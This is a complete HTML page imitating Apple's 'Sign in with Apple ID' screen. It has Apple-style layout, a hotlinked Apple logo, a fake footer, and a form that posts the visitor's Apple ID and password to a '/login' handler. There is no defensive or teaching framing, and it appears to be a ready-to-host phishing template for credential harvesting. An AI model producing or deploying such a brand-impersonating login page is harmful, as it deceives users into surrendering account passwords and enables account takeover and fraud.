<!DOCTYPE html>
<html>
<head>
    <title>Sign in with Apple ID</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { width: 450px; text-align: center; }
        .logo { width: 40px; margin-bottom: 20px; }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 30px; }
        input { width: 100%; padding: 15px; border: 1px solid #d2d2d7; border-radius: 8px; margin-bottom: 10px; font-size: 17px; box-sizing: border-box; }
        button { background: none; border: none; cursor: pointer; position: absolute; right: 15px; top: 15px; }
        .input-group { position: relative; width: 100%; }
        .footer { position: fixed; bottom: 20px; font-size: 12px; color: #86868b; }
    </style>
</head>
<body>
    <div class="container">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
        <h1>Sign in with Apple ID</h1>
        <form action="/login" method="POST">
            <input type="text" name="email" placeholder="Apple ID" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Continue" style="background: #0071e3; color: #fff; border: none; cursor: pointer; font-weight: 500;">
        </form>
    </div>
    <div class="footer">Apple ID | Support | Privacy Policy</div>
</body>
</html>
